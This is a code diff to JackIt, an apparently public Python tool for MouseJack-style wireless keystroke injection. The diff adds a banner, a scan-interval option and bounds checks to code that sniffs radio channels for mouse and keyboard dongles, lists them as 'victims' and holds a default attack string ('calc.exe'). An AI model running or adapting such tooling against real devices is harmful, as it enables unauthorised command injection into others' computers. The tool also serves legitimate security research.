@@ -10,7 +10,7 @@ import tabulate
 __version__ = 0.01
 __authors__ = "phikshun, infamy"
 
-#some console colours
+# some console colours
 W = '\033[0m'  # white (normal)
 R = '\033[31m'  # red
 G = '\033[32m'  # green
@@ -29,9 +29,9 @@ class scanner:
     self.radio = radio
     self.channels = range(2, 84)
     self.channel_index = 0
-    self.debug  = debug
+    self.debug = debug
     self.devices = {}
-    
+
     # Format the ACK timeout and auto retry values
     self.ack_timeout = int(ack_timeout / 250) - 1
     self.ack_timeout = max(0, min(ack_timeout, 15))
@@ -58,29 +58,32 @@ class scanner:
     last_tune = time.time()
     total_time = time.time()
 
-    while time.time() - total_time < timeout:
+    try:
+      while time.time() - total_time < timeout:
 
-      if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
-        self.channel_index = (self.channel_index + 1) % (len(self.channels))
-        self.radio.set_channel(self.channels[self.channel_index])
-        last_tune = time.time()
+        if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
+          self.channel_index = (self.channel_index + 1) % (len(self.channels))
+          self.radio.set_channel(self.channels[self.channel_index])
+          last_tune = time.time()
 
-      value = self.radio.receive_payload()
-      if len(value) >= 5:
-        address, payload = value[0:5], value[5:]
-        a = self.hexify(address)
-        self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))
+        value = self.radio.receive_payload()
+        if len(value) >= 5:
+          address, payload = value[0:5], value[5:]
+          a = self.hexify(address)
+          self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))
 
-        if a in self.devices:
-          self.devices[a]['count'] += 1
-          self.devices[a]['timestamp'] = time.time()
-          if not self.channels[self.channel_index] in self.devices[a]['channels']:
-            self.devices[a]['channels'].append(self.channels[self.channel_index])
-          if len(payload) > len(self.devices[a]['payload']):
-            self.devices[a]['payload'] = payload
-        else:
-            self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
+          if a in self.devices:
+            self.devices[a]['count'] += 1
             self.devices[a]['timestamp'] = time.time()
+            if not self.channels[self.channel_index] in self.devices[a]['channels']:
+              self.devices[a]['channels'].append(self.channels[self.channel_index])
+            if len(payload) > len(self.devices[a]['payload']):
+              self.devices[a]['payload'] = payload
+          else:
+              self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
+              self.devices[a]['timestamp'] = time.time()
+    except RuntimeError:
+      pass
     return self.devices
 
   def sniff(self, address):
@@ -312,11 +315,23 @@ def _debug(text):
 @click.option('--debug', is_flag=True, help='Enable debug.')
 #@click.option('--attack', default="calc.exe\n", help="String to use for the attack")
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
-def cli(debug, lowpower):
+@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
+def cli(debug, lowpower, interval):
   enable_debug = debug
   attack = "calc.exe\n"
 
-  print "Mousite version %0.2f" % __version__
+  print """
+     ____.              __   .___  __   
+    |    |____    ____ |  | _|   |/  |_ 
+    |    \__  \ _/ ___\|  |/ /   \   __\\
+/\__|    |/ __ \\\\  \___|    <|   ||  |  
+\________(____  /\___  >__|_ \___||__|  
+              \/     \/     \/          """
+
+  print "JackIt Version %0.2f" % __version__
+  print "Created by %s" % __authors__
+  print ""
+
   if debug:
     print O + "[W] " + W + "Debug is enabled"
 
@@ -347,10 +362,10 @@ def cli(debug, lowpower):
   try:
     try:
       while True:
-        devices = scan.scan(5.0)
+        devices = scan.scan(interval)
 
         click.clear()
-        print GR + "[+] " + W + "Scanning every 5s " + G + "CTRL-C " + W + "when ready."
+        print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
         print ""
         
         idx = 0
@@ -371,11 +386,11 @@ def cli(debug, lowpower):
     except KeyboardInterrupt:
       print "\n"
 
-      if len(devices) == 0:
+      if 'devices' not in locals() or len(devices) == 0:
         print R + "[!] " + W + "No devices found please try again..."
         exit(-1)
       
-      print GR + "\n [+]" + W + " select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
+      print GR + "\n[+]" + W + " select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
             " separated by commas, or '%s': " % (G + 'all' + W),
       value = click.prompt('', default="all")
       value = value.strip().lower()
@@ -385,7 +400,10 @@ def cli(debug, lowpower):
       else:
         victims = []
         for vic in value.split(","):
-          victims.append(pretty_devices[(int(vic)-1)])
+          if int(vic) <= len(pretty_devices):
+            victims.append(pretty_devices[(int(vic)-1)])
+          else:
+            print R + "[!] " + W + ("Device %d key is out of range" % int(vic))
       print victims
 
       #if len(payload) == 19 and payload[1] == 0x90:
